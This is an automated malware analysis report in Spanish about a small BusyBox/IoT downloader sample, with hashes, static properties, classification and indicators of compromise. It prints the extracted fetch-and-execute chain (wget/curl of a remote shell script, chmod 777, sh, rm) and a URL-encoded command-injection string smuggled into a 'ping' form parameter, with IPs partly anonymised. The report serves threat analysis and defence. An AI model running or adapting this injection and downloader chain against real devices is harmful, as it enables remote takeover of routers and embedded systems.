# 🧬 Payload Analysis

`e6ade64eec6f49384269434b0bbfbecc15177ec090b3276af705506c7d289cdd`

## 📌 Resumen

Texto ASCII de 416 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `busybox wget hxxp://91.92.40.XXX/wget.sh -O .s`
2. `curl -o .s hxxp://91.92.40.XXX/wget.sh`
3. `chmod 777 .s`
4. `sh .s rep.ddiag`
5. `rm -f .s`
6. `cd /tmp`
7. `wget hxxp://91.92.40.XXX/wget.sh -O .s`
8. `busybox wget hxxp://91[.]` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/e6ade64eec6f49384269434b0bbfbecc15177ec090b3276af705506c7d289cdd.md](../../../../../malware-like/oraculo/downloader/e6ade64eec6f49384269434b0bbfbecc15177ec090b3276af705506c7d289cdd.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `e6ade64eec6f49384269434b0bbfbecc15177ec090b3276af705506c7d289cdd`
- **SHA1:** `0b9fd87567d03465b16bcb04e3d118b6c0b79ca2`
- **MD5:** `1ab28baa09d3dca1bff357d9c0348977`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 416 B |
| Entropía | 5.18 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
act=ping&dst=%26%20cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.ddiag%3Brm%20-f%20.s%26 | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | act=ping&dst=%26%20cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91. | strings |
| hash | e6ade64eec6f49384269434b0bbfbecc15177ec090b3276af705506c7d289cdd | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
